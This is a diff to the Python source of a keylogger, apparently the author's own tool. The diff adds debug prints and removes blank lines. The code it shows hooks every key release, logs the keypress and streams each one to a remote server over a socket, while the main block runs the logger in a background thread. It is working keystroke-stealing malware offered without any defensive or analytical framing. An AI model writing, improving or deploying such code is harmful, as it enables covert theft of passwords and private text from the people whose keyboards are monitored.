@@ -85,21 +85,20 @@ class Keylogger:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         self.log += name
+        print(f"Captured keypress: {name}")  # Debug print
         self.send_keypress(name)
 
     def send_keypress(self, keypress):
         try:
             self.server_socket.sendall(keypress.encode())
+            print(f"Sent keypress: {keypress}")  # Debug print
         except Exception as e:
             print(f"Error sending keypress: {e}")
-
-
 
     def start(self):
         keyboard.on_release(callback=self.callback)
         print(f"{datetime.now()} - Started keylogger")
         keyboard.wait()
-
 
 
 # Main program execution
@@ -111,4 +110,3 @@ keylogger = Keylogger(interval=5, server_socket=s)
 keylogger_thread = threading.Thread(target=keylogger.start)
 keylogger_thread.start()
 # keylogger_thread.join()
-
